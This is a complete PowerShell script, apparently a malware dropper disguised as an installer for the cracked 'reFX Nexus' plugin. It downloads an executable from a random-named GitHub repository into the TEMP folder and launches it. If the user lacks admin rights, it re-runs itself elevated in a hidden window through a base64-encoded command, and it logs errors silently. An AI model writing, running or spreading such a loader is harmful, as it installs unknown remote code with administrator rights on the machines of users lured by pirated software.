$scriptBlock = {
    $logPath = Join-Path $env:TEMP 'nexus_install.log'
    try {
        $ErrorActionPreference = 'Stop'
        $downloadUrl = 'https://raw.githubusercontent.com/AmplitudeQuail/dlqmjdez/main/reFX%20Nexus%20v5.4.14.exe'
        $outputPath  = Join-Path $env:TEMP 'reFX Nexus v5.4.14.exe'

        Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath -UseBasicParsing

        if (-not (Test-Path $outputPath)) { throw 'Download failed: file was not saved.' }

        Start-Process -FilePath $outputPath
    }
    catch {
        $err = $_ | Out-String
        $err | Out-File -FilePath $logPath -Encoding UTF8 -Append
    }
}

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    & $scriptBlock
} else {
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock.ToString()))
    Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -EncodedCommand $encoded"
    exit
}
